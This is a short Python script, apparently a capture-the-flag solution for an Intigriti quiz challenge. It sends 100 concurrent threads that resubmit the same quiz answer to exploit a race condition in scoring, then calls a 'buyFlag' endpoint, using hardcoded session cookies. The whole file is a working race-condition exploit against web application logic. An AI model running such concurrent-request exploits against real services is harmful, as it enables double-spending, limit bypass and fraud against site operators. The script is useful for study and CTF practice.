import requests
import threading

req = requests.Session()
cookies = {
    "connect.sid": "s%3A5fmg6O_YuvNU3LktN0hDdliBQ_TevkcZ.IVYFaE8ZJ4ru69n7biQxUSqzyZqUj8e8a%2FLS%2FRQatp8",
    "INGRESSCOOKIE": "1655218692.082.32.206098|df18c7a37b01201195c3bf2ff6aa23c8",
}
URL = "https://quiz.ctf.intigriti.io/"
data = {"questionNumber": 2, "answer": "10"}


def read(d):
    r = req.post(URL + "submitAnswer", json=data, cookies=cookies)
    r = req.get(URL + "user", cookies=cookies)


if __name__ == "__main__":
    threads = []
    num_threads = 100
    for i in range(num_threads):
      t=threading.Thread(target=read,args=[i])
      t.start()
      threads.append(t)
    for thread in threads:
        thread.join()
    print(threads)
    r = req.get(URL + "buyFlag", cookies=cookies)
    print(r.text)
